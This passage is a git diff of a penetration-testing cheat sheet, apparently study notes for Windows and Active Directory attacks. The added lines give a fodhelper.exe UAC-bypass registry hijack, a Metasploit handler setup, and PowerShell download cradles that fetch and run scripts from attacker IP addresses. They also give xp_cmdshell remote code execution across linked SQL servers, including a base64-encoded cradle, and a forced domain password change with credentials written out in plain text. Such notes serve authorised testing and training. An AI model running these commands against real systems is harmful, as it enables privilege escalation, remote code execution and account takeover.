@@ -163,8 +163,23 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username 'dcorp\student551' -Verbose
 net localgroup administrators (check your user was added)
 ```
 
-#### UACBypass.ps1
+#### UAC Bypass
+Option 1: uacbypass.ps1
+
 https://github.com/Octoberfest7/OSEP-Tools/blob/main/uacbypass.ps1
+
+Option 2: Fodhelper.exe with PS shellcode runner
+
+```
+use exploit/multi/handler
+set EnableStageEncoding true
+set StageEncoder x64/zutto_dekir
+run
+
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force    
+C:\Windows\System32\fodhelper.exe
+```
 
 #### LAPS 
 ```
@@ -281,6 +296,9 @@ EXEC ('xp_cmdshell ''powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIAB
 pwsh 
 $text = "IEX((new-object system.net.webclient).downloadstring('http://192.168.45.201/run.ps1'))";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText
 
+#Other RCE download cradles
+EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.7/script.ps1") | powershell -noprofile'
+
 #RCE 2nd Linked Server
 EXEC ('EXECUTE AS LOGIN = ''sa'';EXEC sp_configure ''show advanced options'', 1;reconfigure; EXEC sp_configure ''xp_cmdshell'',1;reconfigure') AT SQL53
 EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADEALwByAHUAbgAuAHAAcwAxACcAKQApAA==''') AT SQL53
@@ -296,6 +314,8 @@ EXEC master..xp_dirtree "\192.168.49.67\share";
 #### ForceChangePassword
 ```
 Set-DomainUserPassword -Identity black -AccountPassword (ConvertTo-String 'Passw0rd' -AsPlainText -Force) -Verbose
+
+net rpc passowrd "Jamie@zsm.local" "NewPass123!" -u "zsm.local/Marcus"%"!QAZ2wsx" -S 192.168.210.10 
 ```
 
 #### Add Group Member
